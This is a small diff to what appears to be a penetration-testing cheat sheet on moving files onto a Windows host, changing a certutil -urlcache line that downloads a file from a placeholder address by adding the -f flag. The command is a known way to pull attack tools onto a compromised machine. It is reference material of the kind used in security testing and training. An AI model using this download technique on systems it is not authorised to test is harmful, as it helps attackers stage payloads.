@@ -13,7 +13,7 @@ Copy & paste with base64 encoding.
 
 # certutil
 
-`certutil -urlcache http://ipaddress/filename outputfilename`
+`certutil -urlcache -f http://ipaddress/filename outputfilename`
 
 # FTP
 
